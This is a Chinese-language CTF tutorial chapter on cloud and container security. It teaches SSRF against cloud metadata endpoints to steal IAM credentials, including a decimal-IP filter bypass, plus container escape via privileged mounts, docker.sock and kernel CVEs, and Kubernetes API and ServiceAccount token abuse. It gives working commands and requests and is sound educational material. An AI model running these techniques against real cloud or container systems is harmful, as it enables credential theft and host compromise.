---
comments: true
---

# 云与容器安全

在「Docker与漏洞环境」一章里，我们学会了用 Docker 几分钟拉起一个漏洞靶场——那是"**会搭**"。但 CTF 出题人不会只让你当运维：越来越多的题目把环境搭在云服务器、Docker 容器甚至 K8s 集群里，题目真正的考点也从 Web 漏洞本身延伸到了"**会打**"（打云上资产）和"**会逃**"（从容器里逃到宿主机拿 flag）。

这一章就补齐这两步：先讲云厂商的元数据服务怎么配合 SSRF 偷凭证，再讲容器逃逸的三个常见面，最后过一遍 K8s 的极简考点。理念依旧是"够用即止"——每个面讲清原理、给你判断方法，让你拿到题就知道往哪儿打。

## 云元数据服务：SSRF 的隐藏奖励关卡

### 原理

主流云厂商（AWS、阿里云、腾讯云、GCP）给每台云主机提供了一个 **元数据服务（Metadata Service）**，通过固定链路本地地址 `169.254.169.254` 访问（阿里云是 `100.100.100.200`）。只有本机能访问它——这本来是为了方便云主机查自己的配置信息，比如主机名、内网 IP、启动脚本（user-data）。

问题来了：如果云主机绑定了 **IAM 角色**，元数据服务里还能拿到这个角色对应的 **临时访问凭证**（AccessKey / SecretKey / Token）。拿到凭证就能以云主机的身份调用该云的所有 API——列举 OSS 桶、读数据库、甚至控制其他云主机。

而「SSRF注入」一章讲过：SSRF 让服务器替我们去请求任意 URL。那么——**服务器能访问的"本机"，恰好包括元数据服务**。SSRF + 元数据服务，就是云环境 CTF 题的标准组合拳。

### 怎么打

假设 SSRF 点还是熟悉的样子（URL 抓取、远程头像、XML 解析外部实体等，详见「SSRF注入」章），直接往里塞元数据地址：

```http
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
```

AWS 上这一级会列出绑定的角色名，再拼上角色名：

```http
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role HTTP/1.1
```

响应长这样：

```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "wJalr...",
  "Token": "FQoGZXIvYXdz...",
  "Expiration": "2026-08-30T15:00:00Z"
}
```

其他云厂商的路径不同但套路一致，CTF 里遇到现查即可：

- 阿里云：`http://100.100.100.200/latest/meta-data/ram/security-credentials/<角色名>`
- 腾讯云：`http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/<角色名>`
- GCP：`http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`（需带 `Metadata-Flavor: Google` 请求头）

有防护意识的题目会把直接访问 `169.254.169.254` 的 IP 拦掉，这时就回到 SSRF 绕过那套老手艺：短网址跳转、域名解析到内网 IP、进制转换（如 `http://2852039166/`）、`[::]` IPv6 等——「SSRF注入」章里都有。

## 容器逃逸：从"里面"到"外面"

### 先判断：我是不是在容器里

拿到一个 RCE（参看「RCE」章）之后第一件事：确认自己所处的环境。几条命令基本能盖棺定论：

```bash
# Docker 会在容器根目录留下这个文件
ls /.dockerenv

# 查看 cgroup，容器里通常带 docker/kubepods 字样
cat /proc/1/cgroup
cat /proc/self/cgroup

# 容器的 1 号进程一般是应用本身，而非 systemd/init
ps -p 1 -o comm=
```

确认在容器里之后，逃逸思路就是看 **这个容器有没有拿到不该有的权限**。下面是三个最常见的面。

### 面一：特权容器（--privileged）

**原理**：用 `--privileged` 启动的容器几乎拥有宿主机的全部能力（capabilities），包括 `CAP_SYS_ADMIN`，还能直接看到宿主机的块设备（`/dev/sda` 之类）。这等于把隔离的墙拆了。

**判断方法**：

```bash
# 查看当前进程的 capability，CapEff 很大（比如 000001ffffffffff）基本就是特权容器
cat /proc/self/status | grep CapEff

# 能列出宿主机磁盘设备也是强信号
fdisk -l
```

**逃逸**：有特权就直接把宿主机的根分区挂进来：

```bash
mkdir /mnt/host
mount /dev/sda1 /mnt/host
# 现在 /mnt/host 就是宿主机的 /，flag 随便拿
cat /mnt/host/root/flag
```

拿不到块设备时，还有经典的 cgroup `release_agent` 手法（特权容器可写 `cgroup.procs` 触发宿主机执行任意命令），CTF 中知道有这条路、能搜到现成 exp 即可。

### 面二：挂载了 docker.sock

**原理**：`/var/run/docker.sock` 是 Docker 守护进程的 API 套接字。容器内部（比如 CI 工具）有时为了管理别的容器会把它挂进来。可谁拿到这个 socket，谁就能命令守护进程 **再创建一个新容器**——而新容器可以把宿主机的 `/` 整个挂进去。等于借 Docker 的手开了一扇后门。

**判断方法**：

```bash
# 简单粗暴：socket 文件存在即可疑
ls -l /var/run/docker.sock
```

**逃逸**：容器里如果有 `docker` 客户端直接用最省事：

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host bash
```

没有客户端就用 HTTP API 手工调（socket 上走的也是 HTTP）：

```bash
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
# 再构造 JSON 调 /containers/create + /containers/{id}/start，挂载根目录即可
```

### 面三：内核漏洞

**原理**：这是容器和虚拟机最本质的区别——**容器和宿主机共用同一个内核**。容器隔离靠的是 namespace 和 cgroup，都是内核提供的功能；所以一旦内核本身有洞，从容器里打内核，效果直接落在宿主机上。

**判断方法**：

```bash
uname -a   # 看内核版本，老版本（如 < 4.8.3）几乎必有洞
```

CTF 中常见的两个：

- **DirtyCow（CVE-2016-5195）**：影响内核 2.6.22 ～ 4.8.3，条件竞争改写只读文件。虽然会被 KPTI 等缓解措施影响，但在没打补丁的老题目环境里仍是常客。
- **DirtyPipe（CVE-2022-0847）**：影响内核 5.8 ～ 5.16.11，可越权写任意只读文件（比如往宿主机 `/etc/passwd` 写 root 后门），因为不需要调试内核结构，容器场景下利用相对稳定。

内核洞利用属于"捡现成 exp"的领域：搜 CVE 编号 + "container escape"，编译上传运行即可。注意这类 exp 容易打挂环境，**打本地复现靶场随便造，打线上赛题前三思**。

## K8s 极简考点

K8s（Kubernetes）是把成百上千容器编排起来的系统。CTF 里不会考你运维集群，考的是两个"门没锁"的场景。

### 考点一：API Server 未授权访问

K8s 的大脑是 API Server（默认端口 `6443`）。配置不当（旧版常见于 `--insecure-port=8080` 开放，或匿名用户被赋予了过高权限）时，不认证就能直接调 API：

```bash
# 查看是否能匿名列出 Pod
curl -k https://10.0.0.1:6443/api/v1/pods

# 能列就能进一步 exec 进 Pod 执行命令
curl -k -X POST "https://10.0.0.1:6443/api/v1/namespaces/default/pods/target/exec?command=cat&command=/flag" \
  -H "X-Stream-Protocol-Version: v4.channel.k8s.io"
```

有 `kubectl` 的话一行就够：`kubectl -s https://10.0.0.1:6443 --insecure-skip-tls-verify get pods`。

### 考点二：ServiceAccount token

K8s 给每个 Pod 默认挂了一份身份凭证，路径是固定的：

```bash
ls /var/run/secrets/kubernetes.io/serviceaccount/
# token  ca.crt  namespace
```

这个 token 是 JWT，拿着它就能以该 ServiceAccount 的身份访问 API Server：

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/secrets
```

题目的弯弯绕在 **权限** 上：这个 SA 有没有列 secrets 的权限、能不能创建挂载宿主机目录的 Pod，决定了你能不能读到 flag。用 `kubectl auth can-i --list --token=$TOKEN` 可以快速摸清自己能干什么。secrets 里存的东西是 Base64 编码的，拿到记得 `-d` 解码。

## CTF 中的识别特征

把上面这些串起来，遇到题怎么快速定位考点：

- **给了 URL 抓取/远程加载功能，响应里出现 `AccessKeyId`、`SecurityCredentials`、`meta-data` 字样** → 云元数据 + SSRF 题，往 `169.254.169.254`（或阿里云 `100.100.100.200`）打。
- **附件是 Dockerfile / docker-compose.yml，或页面底部写着 `Powered by Docker`，且能 RCE** → 多半要逃逸。先 `ls /.dockerenv` 确认，再依次查：`/var/run/docker.sock` 在不在 → `CapEff` 大不大 → `uname -a` 老不老。
- **命令执行后返回里出现 `kubepods`、`kubernetes` 字样，或者环境里挂着 `serviceaccount` 目录** → K8s 题，找 token、查权限、读 secrets。
- **提示信息里有 "cloud"、"metadata"、"escape"、"privesc" 之类字眼** → 出题人在给你划重点，别忽视。

一句话总结：**flag 不在 Web 根目录，多半在容器外面；flag 不在容器外面，多半在云账号里。**

## 例题：一道"SSRF 打云凭证"完整流程

下面这道是自编的迷你题，完整走一遍从发现到拿 flag 的过程。用「Docker与漏洞环境」章的方法本地复现：

```bash
mkdir cloud-ctf && cd cloud-ctf
cat > app.py <<'EOF'
from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/fetch')
def fetch():
    url = request.args.get('url', '')
    if not url.startswith('http'):
        return 'only http(s) allowed'
    # 出题人的"防护"：拦了明文的 169.254.169.254
    if '169.254.169.254' in url:
        return 'hacker!'
    return requests.get(url, timeout=3).text

app.run(host='0.0.0.0', port=8000)
EOF
docker build -t cloud-ctf - <<'EOF'
FROM python:3.11-slim
RUN pip install flask requests
COPY app.py .
CMD ["python", "app.py"]
EOF
docker run -d -p 8000:8000 cloud-ctf
```

（真实题目环境里，`169.254.169.254` 由云厂商或题目仿真的 metadata 服务应答，本地复现可以自己起一个简单服务监听对应路径。）

**解题过程**：

第一步，测 SSRF。访问 `http://127.0.0.1:8000/fetch?url=http://127.0.0.1:8000/fetch`，返回异常但能回显内容，说明服务端确实替我们发请求了——SSRF 点确认。

第二步，试元数据地址，被拦了：`/fetch?url=http://169.254.169.254/latest/meta-data/` 返回 `hacker!`。过滤是字符串匹配，用「SSRF注入」章的绕过手法，把 IP 转成十进制整数：

```bash
python3 -c "print(0xA9FEA9FE)"   # 169.254.169.254 -> 2852039166
```

第三步，绕过打凭证：

```http
GET /fetch?url=http://2852039166/latest/meta-data/iam/security-credentials/ HTTP/1.1
```

返回角色名 `ctf-role`，继续：

```http
GET /fetch?url=http://2852039166/latest/meta-data/iam/security-credentials/ctf-role HTTP/1.1
```

拿到临时凭证三元组。题目环境里通常下一步是拿这组凭证调仿真 OSS/S3 接口，从私有桶里 `cat flag`，flag 到手。

这道题把本章和前面的知识串成了一根线：**SSRF 注入（会打 Web）→ 元数据服务（会打云）→ 凭证利用（会打账号）**。如果题目再进一步——Web 在容器里、flag 在宿主机——那就把中间那段换成 `/.dockerenv` 检查加 `docker.sock` 逃逸，套路完全对称。

## 小结

- 云主机的"本机服务"不止 127.0.0.1，还有 `169.254.169.254`；SSRF 能打的内网资产，云环境里第一优先想元数据。
- 容器逃逸先侦察：`/.dockerenv`、`cgroup`、`CapEff`、`docker.sock`、`uname -a`，五个点查完基本知道从哪出。
- K8s 就记两个门：API Server 有没有锁（6443 匿名访问），Pod 里的 token 权限有多大。
- 会搭（Docker）→ 会打（SSRF/云）→ 会逃（容器/K8s），这条线走完，云与容器类的 CTF 题就不再是黑盒。
